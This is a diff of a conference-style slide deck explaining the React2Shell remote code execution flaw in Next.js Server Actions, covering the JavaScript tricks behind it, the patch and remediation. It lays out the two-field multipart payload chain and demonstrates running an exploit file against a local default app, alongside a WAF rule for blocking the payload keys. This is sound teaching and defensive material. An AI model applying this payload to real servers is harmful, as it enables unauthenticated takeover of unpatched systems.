@@ -12,13 +12,13 @@ options:
 
 Intro
 ===
-<!-- speaker_note: Disclosed Dec 3 2025 by Lachlan Davidson - patch released same day -->
-<!-- speaker_note: CVSS 10.0 - maximum possible severity -->
-<!-- speaker_note: Scope - any Next.js App Router app - the default since Next.js 13, no server actions required -->
-<!-- speaker_note: One POST request and you have full RCE, so you can set up permanence, access files, people were running crypto miners -->
 
 # CVE-2025-55182 - **React2Shell**
 ### Unauthenticated RCE via Next.js Server Actions
+
+<!-- speaker_note: Disclosed Dec 3 2025 by Lachlan Davidson - patch released same day -->
+
+<!-- pause -->
 
 ```
 Affects:   react-server-dom-webpack,           19.0, 19.1.0, 19.1.1, 19.2.0
@@ -33,14 +33,45 @@ Impact:    Full server-side code execution
 ```
 <!-- alignment: center -->
 
+<!-- speaker_note: CVSS 10.0 - maximum possible severity -->
+<!-- speaker_note: Scope - any Next.js App Router app - the default since Next.js 13, no server actions required -->
+<!-- speaker_note: One POST request and you have full RCE, so you can set up permanence, access files, people were running crypto miners -->
+
+<!-- pause -->
+
 ---
 
-This Presentation:     
+This Presentation:
+
+<!-- new_line -->
+
 Context of how it works     →     Run the exploit locally
 
 
 <!-- end_slide -->
 
+<!-- alignment: center -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+<!-- new_line -->
+# Tricks
+
+<!-- end_slide -->
 
 JS Trick #1: Thenables
 ===
@@ -51,6 +82,10 @@ JS Trick #1: Thenables
 
 `await` doesn't check `instanceof Promise`.
 Any object with a `.then` method is auto-called:
+
+<!-- speaker_note: First primitive - JS spec says if a value has a .then that's a function, call it - no instanceof check -->
+
+<!-- pause -->
 
 <!-- column_layout: [3,2] -->
 
@@ -79,13 +114,14 @@ Promise.resolve(sneaky).then(v =>
 
 <!-- column: 0 -->
 
+<!-- speaker_note: The exploit uses this to hijack React's internal await on deserialized chunks -->
+
+<!-- pause -->
 
 
 ---
 **Control `.then` on an object → control what `await` does.**
 
-<!-- speaker_note: First primitive - JS spec says if a value has a .then that's a function, call it - no instanceof check -->
-<!-- speaker_note: The exploit uses this to hijack React's internal await on deserialized chunks -->
 <!-- speaker_note: Next - constructor chaining - how we get Function from any object -->
 
 <!-- end_slide -->
@@ -94,12 +130,12 @@ JS Trick #2: Constructor chaining
 ===
 ## Every object leads to `Function`
 
-<!-- speaker_note: Second primitive - every object's .constructor points to its class; every class's .constructor is Function -->
-<!-- speaker_note: Flight decoder does unchecked prototype traversal - attacker reaches Function from any chunk object -->
-<!-- speaker_note: Function(string) is basically eval - combined with thenables, those are the two building blocks -->
-
 Every JavaScript object has a `.constructor` property - the class that created it.
 Every class is a function, so its `.constructor` is `Function`.
+
+<!-- speaker_note: Second primitive - every object's .constructor points to its class; every class's .constructor is Function -->
+
+<!-- pause -->
 
 <!-- column_layout: [8, 3] -->
 
@@ -116,6 +152,8 @@ console.log(obj.constructor.constructor === Function);
 <!-- column: 1 -->
 
 <!-- snippet_output: constructor_chain -->
+
+<!-- speaker_note: Flight decoder does unchecked prototype traversal - attacker reaches Function from any chunk object -->
 
 <!-- pause -->
 
@@ -144,6 +182,10 @@ console.log(F("return process.version")());
 
 <!-- alignment: center -->
 
+<!-- speaker_note: Function(string) is basically eval - combined with thenables, those are the two building blocks -->
+
+<!-- pause -->
+
 **Two property hops from any object → dynamic code execution.**
 
 <!-- end_slide -->
@@ -151,9 +193,9 @@ console.log(F("return process.version")());
 Context
 ===
 
-<!-- speaker_note: This vulnerability affected Server Actions - functions marked "use server" the browser calls via POST in order for react's server components to update the server -->
-
 ## Server Actions & the Flight Protocol
+
+<!-- speaker_note: This vulnerability affected Server Actions - functions marked "use server" the browser calls via POST in order for react's server components to update the server -->
 
 ```typescript
 "use server"
@@ -167,21 +209,23 @@ On submit the browser POSTs to the page URL.
 
 <!-- pause -->
 
-<!-- speaker_note: Arguments serialized in React's Flight protocol - numbered multipart chunks -->
-
 ---
 
 Arguments are serialized in React's **Flight** format:
 
+<!-- speaker_note: Arguments serialized in React's Flight protocol - numbered multipart chunks -->
+
 ```
 POST /
-Next-Action: <sha256-hash>   
+Next-Action: <sha256-hash>
 Content-Type: multipart/form-data
 
 Field "0":  ["$1"]
 Field "1":  {"item":"widget","vendor":"$2:vendorName"}
 Field "2":  {"vendorName":"Vehikl"}
 ```
+
+<!-- pause -->
 
 
 `$`-prefixed strings are cross-chunk references resolved by the decoder.
@@ -193,11 +237,7 @@ Field "2":  {"vendorName":"Vehikl"}
 Context cont.
 ===
 
-<!-- speaker_note: Decoder does result = result[key] - no own-property check -->
-<!-- speaker_note: \'constructor\' is inherited, not own - decoder happily walks the prototype chain -->
-<!-- speaker_note: Two hops → Function; combined with thenables → RCE -->
-
-## Flight Deserialization 
+## Flight Deserialization
 
 
 ```
@@ -211,6 +251,10 @@ Field "2":  {"vendorName":"Vehikl"}
 The decoder resolves `$2:vendorName` with bracket access - `obj["vendorName"]`.
 
 No check whether the key is an **own property**:
+
+<!-- speaker_note: Decoder does result = result[key] - no own-property check -->
+
+<!-- pause -->
 
 <!-- column_layout: [3, 1] -->
 
@@ -238,7 +282,10 @@ console.log(
 
 <!-- reset_layout -->
 
-<!-- pause -->
+<!-- speaker_note: constructor is inherited, not own - decoder happily walks the prototype chain -->
+
+
+<!-- speaker_note: Two hops → Function; combined with thenables → RCE -->
 
 
 <!-- end_slide -->
@@ -249,15 +296,11 @@ The Gadget Chain
 
 ## The Payload
 
-<!-- speaker_note: Two multipart fields - no custom classes, no memory corruption -->
-
 Two chunks only:
 
+<!-- speaker_note: Two multipart fields - no custom classes, no memory corruption -->
+
 <!-- pause -->
-
-<!-- speaker_note: Field 0 - fake Chunk with attacker-controlled fields - every key targets a specific step in the chain -->
-
-<!-- speaker_note: Field 1 - self-reference back to field 0, gives the decoder a real object to traverse -->
 
 ```json
 Field "0": {
@@ -274,23 +317,26 @@ Field "0": {
 Field "1": "$@0"
 ```
 
+<!-- speaker_note: Field 0 - fake Chunk with attacker-controlled fields - every key targets a specific step in the chain -->
+<!-- speaker_note: Field 1 - self-reference back to field 0, gives the decoder a real object to traverse -->
+
+<!-- pause -->
+
 Runs on **any route**, before auth, middleware, or action ID validation.
 `Next-Action: x` (any value) is enough to trigger deserialization.
 
 
 <!-- end_slide -->
 
-The Gadget Chain: Explained 
+The Gadget Chain: Explained
 ===
-
-<!-- speaker_note: \"$1-__proto__-then\" steals Chunk.prototype.then → our object becomes a thenable -->
-<!-- speaker_note: Decoder awaits → JS auto-calls .then() -->
-<!-- speaker_note: \"status - resolved_model\" triggers initializeModelChunk on our fake chunk -->
-<!-- speaker_note: _response is normally trusted - here it's fully attacker-controlled -->
 
 ## Payload Steps 1 & 2 - Thenable + initialization
 
 `"then": "$1:__proto__:then"` - steals `Chunk.prototype.then`
+
+<!-- speaker_note: $1-__proto__-then steals Chunk.prototype.then → our object becomes a thenable -->
+<!-- speaker_note: Decoder awaits → JS auto-calls .then() -->
 
 ```json
 [0]: {
@@ -312,6 +358,9 @@ Chunk 0 becomes a thenable → `await` calls `.then()` automatically.
 
 `"status": "resolved_model"` - triggers chunk initialization
 
+<!-- speaker_note: status - resolved_model triggers initializeModelChunk on our fake chunk -->
+<!-- speaker_note: _response is normally trusted - here it's fully attacker-controlled -->
+
 ```javascript
 // Inside Chunk.prototype.then (simplified):
 if (this.status === "resolved_model") {
@@ -329,14 +378,11 @@ Here it's attacker-controlled.
 The Gadget Chain: Explained cont.
 ===
 
-<!-- speaker_note: \"$1-constructor-constructor\" resolves to Function - assigned to _formData.get -->
-<!-- speaker_note: \"$B0\" triggers the Blob handler - calls _formData.get(_prefix + id) -->
-<!-- speaker_note: Becomes Function(\"<COMMAND>;//\" + \"0\") - the double-slash drops the trailing zero -->
-<!-- speaker_note: Function returns an executable, it runs - shell access -->
-
-## Payload Steps 3 
+## Payload Steps 3
 
 `"_formData": { "get": "$1:constructor:constructor" }` replaces `.get` with `Function`:
+
+<!-- speaker_note: $1-constructor-constructor resolves to Function - assigned to _formData.get -->
 
 ```json
 [0]: {
@@ -352,8 +398,13 @@ The Gadget Chain: Explained cont.
 [1]: "$@0"
 ```
 
+<!-- pause -->
 
 `"value": "{\"then\":\"$B0\"}"` triggers the `$B` (Blob) handler:
+
+<!-- speaker_note: dollar sign B0 triggers the Blob handler - calls _formData.get(_prefix + id) -->
+<!-- speaker_note: Becomes Function("<COMMAND>;//" + "0") - the double-slash drops the trailing zero -->
+<!-- speaker_note: Function returns an executable, it runs - shell access -->
 
 ```javascript
 // Blob handler calls:
@@ -367,36 +418,49 @@ Live Demo - Setup
 ===
 ## Demo Target - Stock Next.js App
 
+<!-- speaker_note: Bone-stock create-next-app - no modifications, no server actions, no custom routes -->
+
 ```bash
 npx create-next-app@16.0.6 demo --yes
 cd demo
 npm run dev
 ```
 
+<!-- pause -->
+
 A completely default Next.js app. No custom code, no server actions defined.
 
 The App Router enables Server Components by default.
 
-<!-- speaker_note: Bone-stock create-next-app - no modifications, no server actions, no custom routes -->
 <!-- speaker_note: App Router enabled by default - that's all the exploit needs -->
 <!-- speaker_note: npm run dev, listening on port 3000 -->
+
+<!-- pause -->
+
+```bash +exec
+hurl <<'EOF' 2>&1 | cut -c1-250
+GET http://localhost:3000
+HTTP 200
+EOF
+```
 
 <!-- end_slide -->
 
 Live Demo
 ===
 
-<!-- speaker_note: Two-field payload via hurl -->
-<!-- speaker_note: Server returns 500 - action ID invalid - but deserialization already happened, command already ran -->
-<!-- speaker_note: One unauthenticated POST -->
-
 ## Live - RCE
+
+<!-- speaker_note: Two-field payload via hurl -->
 
 ```bash +exec
 cat exploit.hurl
 ```
 
 <!-- pause -->
+
+<!-- speaker_note: Server returns 500 - action ID invalid - but deserialization already happened, command already ran -->
+<!-- speaker_note: One unauthenticated POST -->
 
 ```bash +exec
 hurl exploit.hurl 2>&1
@@ -407,9 +471,9 @@ hurl exploit.hurl 2>&1
 The Patch
 ===
 
-<!-- speaker_note: Three independent fixes - any one breaks the chain -->
+## The Fix - Two main changes
 
-## The Fix - Three changes
+<!-- speaker_note: Three independent fixes - any one breaks the chain -->
 
 **1. Own-property check on traversal**
 
@@ -435,10 +499,7 @@ Symbols can't exist in JSON - fake chunks can never provide a fake `_response`.
 
 <!-- pause -->
 
-**3. Type validation on `.then` listeners**
-<!-- speaker_note: Type validation on .then listeners -->
-
-Any single fix breaks the chain. The patch applied all three.
+Any single fix breaks the chain. The patch applied both.
 
 
 <!-- end_slide -->
@@ -450,15 +511,26 @@ Summary
 
 - **Thenables** - `await` works on any object with a `.then`; no `instanceof` check
 <!-- speaker_note: To summarize, there were a few tricks to understand here, using then to turn something into a thenable-->
+
+<!-- pause -->
+
 <!-- new_line -->
 - **Constructor chaining** - two hops from any object reaches `Function`
-<-- speaker_note: We talked about constructor chaining, and the Function constructor which is `eval` -->
-<!-- new_line -->
+<!-- speaker_note: We talked about constructor chaining, and the Function constructor which is `eval` -->
 
+<!-- pause -->
+
+<!-- new_line -->
 - **The bug** - React's Flight decoder resolved cross-chunk references with unchecked bracket access
 <!-- speaker_note: In secure deserialization - letting us walk the prototype chain via crafted field names -->
+
+<!-- pause -->
+
 <!-- new_line -->
 - **The exploit** - two multipart fields, no auth, runs before action ID validation; we saw it execute `whoami` on a stock Next.js app
+
+<!-- pause -->
+
 <!-- new_line -->
 
 **Remediation**
@@ -466,7 +538,7 @@ Summary
 - Upgrade to **Next.js ≥ 16.0.7** / **React ≥ 19.0.1, 19.1.2, 19.2.1**
 - WAF: block `__proto__` and `constructor:constructor` in POST bodies
 
-<!-- comment: 
+<!-- comment:
   Sources:
   - https://cloud.google.com/blog/topics/threat-intelligence/threat-actors-exploit-react2shell-cve-2025-55182
   - https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/
